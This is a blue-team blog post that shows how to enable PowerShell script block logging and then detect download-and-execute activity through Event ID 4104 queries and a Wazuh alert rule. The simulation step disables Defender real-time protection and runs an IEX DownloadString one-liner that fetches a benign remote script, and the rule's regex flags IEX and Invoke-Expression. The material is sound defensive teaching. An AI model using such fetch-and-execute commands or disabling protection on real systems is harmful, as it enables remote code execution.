---
title: Detecting Malicious Script Execution in PowerShell
date: 2024-05-25 06:00:00 -0600
categories: [blueteam, detection]
tags: [difficulty:low, endpoint, os:windows]
image:
  path: https://github.com/lr2t9iz/lr2t9iz.github.io/assets/46981088/3d7c8a9b-d0d6-4a44-9078-b62956a3ac16
---

PowerShell, a powerful Windows command-line shell and scripting language, is often abused by adversaries to execute malicious scripts and commands, one of the most commonly used techniques according to [redcanary](https://redcanary.com/threat-detection-report/techniques/). 

We will explore how attackers leverage PowerShell's capabilities to carry out their intrusions, such as those seen in recent REF4578 intrusions revealed by [Elastic Security Labs](https://www.elastic.co/security-labs/invisible-miners-unveiling-ghostengine) and [Antiy](https://www.antiy.com/response/HideShoveling.html). 
  
![image](https://github.com/lr2t9iz/lr2t9iz.github.io/assets/46981088/260b397b-dcba-45d8-bd7b-41347601c406){: .w-75 }
_[@elasticseclabs](https://x.com/elasticseclabs/status/1792932108073132451)_

## Execution in PowerShell
[T1059.001: PowerShell](https://attack.mitre.org/techniques/T1059/001/), This technique is post-exploitation, meaning that the attacker already has access to a machine and will execute their scripts, similar to the approach used in GhostEngine mining attacks.

![image](https://www.elastic.co/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Finvisible-miners-unveiling-ghostengine%2Fimage10.png&w=1920&q=100){: .w-75 }
_Source: Elastic Security Labs **Download and Excecute a PowerShell Script**_

## Collection
Enabling PowerShell logging is crucial for effective detection of malicious activities. By default, Windows has PowerShell logging disabled, which can hinder our ability to monitor and respond to threats. By configuring detailed logging, we can capture information about every **script block** and **command** executed in PowerShell.
- Open a PowerShell as **Administrator** and run the following commands
```powershell
$basePath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
if (-not (Test-Path $basePath)) { $null = New-Item $basePath -Force }
Set-ItemProperty $basePath -Name EnableScriptBlockLogging -Value "1"
```

## Simulation
For the simulation, we will execute a command line in Cmd to observe how it is logged and detected in lab host. To ensure the commands are executed without interference, we will temporarily disable Windows Defender's real-time protection for testing purposes. This will help us understand the logging process and identify key indicators of potentially malicious activity.
```batch
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/lr2t9iz/PowershellScriptsHub/main/hello_world.ps1');"
```
- Output
![image](https://github.com/lr2t9iz/lr2t9iz.github.io/assets/46981088/9ae2ba5a-4234-4957-a83f-51cdaf6718c9)

## Result
To look up for malicious script execution, we will use the following PowerShell command to query the event logs.
```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" `
-FilterXPath '*[System[EventID=4104]]' | Sort-Object -Property TimeCreated `
| Where-Object {$_.ToXml().Contains("hello_world")} | fl
```
- Result
![image](https://github.com/lr2t9iz/lr2t9iz.github.io/assets/46981088/aea657fe-259a-4531-8184-f7fb7a5a7af9)

## Detection
To do the detection we must have a S1EM ready. if you don't have it yet you can create it following these steps, [Wazuh S1EM](https://c-137lab.com/posts/wazuh-s1em/)

Search for the event in the S1EM
- Wazuh ﹀ Modules > Security events
- Put the following query in the search bar and click on ***Update***
```
data.win.system.channel:"Microsoft-Windows-PowerShell/Operational" AND data.win.system.message:*hello_world*
```
- Query Result
![image](https://github.com/lr2t9iz/lr2t9iz.github.io/assets/46981088/614fe54e-94cc-471f-b10d-493586481e1f)
- To see the content of the script, click on the ***+ sign*** of the processID.

![image](https://github.com/lr2t9iz/lr2t9iz.github.io/assets/46981088/9950b028-c737-4e8d-bf2f-9d13f5764ad2)
![image](https://github.com/lr2t9iz/lr2t9iz.github.io/assets/46981088/0f575891-63e5-4167-9343-6532bb7b5d95)
- To receive an alert we will modify the rule, id 91837.

```xml
<!-- aaa_w1n_overwrite.xml rule file + + + + + -->
<group name="al3rt,">
  <rule id="91837" level="4" overwrite="yes">
    <if_sid>91802</if_sid>
    <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)(Get-Content.+\-Stream|IEX|Invoke-Expresion)</field>
    <group>windows,powershell,</group>
    <description>Powershell executed "Get-Content -Stream or Invoke-Expresion". Possible string execution as code</description>
    <options>no_full_log</options>
    <mitre> <id>T1059.001</id> </mitre>
  </rule>
</group>
```
- The rule is located in the [following repository](https://github.com/lr2t9iz/wazuh-usecases-integrator/tree/main/windows/detection-rules).
- As a result, we will receive a slack alert to detect the powershell execution.
![image](https://github.com/lr2t9iz/lr2t9iz.github.io/assets/46981088/db84acbf-8dcb-4c13-b183-7e560faa7622)
